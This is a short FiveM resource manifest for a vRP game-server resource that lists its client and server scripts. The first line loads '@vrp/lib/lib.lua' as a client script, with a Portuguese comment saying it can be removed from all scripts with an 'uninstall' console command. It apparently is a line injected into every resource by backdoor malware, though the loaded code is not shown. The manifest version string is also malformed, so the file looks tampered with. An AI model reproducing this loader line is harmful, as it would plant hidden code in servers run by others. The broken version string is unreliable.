client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

resource_manifest_version '44febabe-d386-4res-coba-re627f4car37'

dependency 'vrp'

client_scripts {
    "@vrp/lib/utils.lua",
    "config/config.lua",
	"client/client.lua"
}

server_scripts {
	'@vrp/lib/utils.lua',
    "config/config.lua",
	'server/server.lua'
}              